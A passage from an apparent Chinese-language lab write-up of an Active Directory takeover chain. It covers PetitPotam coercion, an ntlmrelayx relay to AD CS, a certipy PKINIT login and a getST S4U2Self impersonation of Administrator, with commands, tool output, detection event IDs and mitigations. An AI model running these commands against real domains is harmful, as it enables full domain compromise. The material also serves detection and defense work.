• 攻擊者持有低權限域帳號（用於觸發 PetitPotam）
• DC 與 CA 必須分離（不同主機），否則 Self-Relay 被阻擋

準備將收到的 NTLM 認證同步轉發至 AD CS HTTP Endpoint。

📡 PetitPotam：強制 DC 發起 NTLM 認證 STEP 4

🔀 ntlmrelayx 同步轉發 → AD CS 核發憑證 STEP 4→5
ntlmrelayx 作為 MITM 同步橋接，即時將 DC$ 的 NTLM 認證轉發至 CA。
AD CS 誤以為是 DC$ 本身申請，核發憑證。
ntlmrelayx 自動儲存為 .pfx，無需手動轉換格式。
# ntlmrelayx 自動輸出（無需手動操作） [*] Authenticating against http://10.0.1.132 as SME/SME-SWP-W-AD$ SUCCEED [*] GOT CERTIFICATE! ID 2 [*] Writing PKCS#12 certificate to ./SME-SWP-W-AD$.pfx
ntlmrelayx (MITM) ──同步轉發──▶ AD CS (10.0.1.132) ──▶ SME-SWP-W-AD$.pfx
✓ 4886 CA 收到申請 ✓ 4887 憑證核發 (Requester: SME\DC$)
4
🎫 certipy auth：PKINIT 取得 DC$ TGT STEP 6
使用 DC$ 憑證透過 PKINIT（憑證式 Kerberos）申請 TGT。
同時透過 U2U 機制取得 DC$ 的 NT Hash。
注意：正確工具是 certipy auth，非 getTGT.py（不支援 PKINIT）。
certipy auth \ -pfx SME-SWP-W-AD\$.pfx \ -username "SME-SWP-W-AD$" \ -domain sme.local \ -dc-ip 10.0.0.206 export KRB5CCNAME=SME-SWP-W-AD\$.ccache
✓ 4768 TGT 申請 PreAuthType=16 (PKINIT) ✗ 非 PreAuthType=2 (一般密碼)
5
🎭 getST.py S4U2Self：模擬 Administrator STEP 7
DC$ 具有 TrustedToAuthForDelegation 屬性，
可透過 S4U2Self 代替任意帳號（Administrator）申請 Service Ticket。
getST.py \ -k -no-pass \ -spn "cifs/SME-SWP-W-AD.sme.local" \ -impersonate Administrator \ -dc-ip 10.0.0.206 \ "sme.local/SME-SWP-W-AD$" export KRB5CCNAME=Administrator.ccache
✓ 4769 Service Ticket 申請 ✓ TransitedServices 不為空（S4U 特徵） ✓ AccountName 為機器帳號（異常）

⚡ v3 修正摘要：
• PetitPotam 觸發產生 4624（非 4648，4648 需明確指定憑證的 API 呼叫）
• ntlmrelayx 自動輸出 .pfx，無需手動轉換 Base64
• PKINIT 正確工具為 certipy auth（非 getTGT.py，後者不支援憑證認證）
• Self-Relay 防護：DC 與 CA 必須分離（已驗證：10.0.0.206 vs 10.0.1.132）
🛡 關鍵防禦措施：
• 啟用 SMB Signing（防止 SMB Relay）
• AD CS 啟用 EPA（Extended Protection for Authentication）
• 啟用 LDAP Signing + Channel Binding
• 封鎖非必要主機對 DC 的 EFS RPC（MS-EFSRPC）呼叫
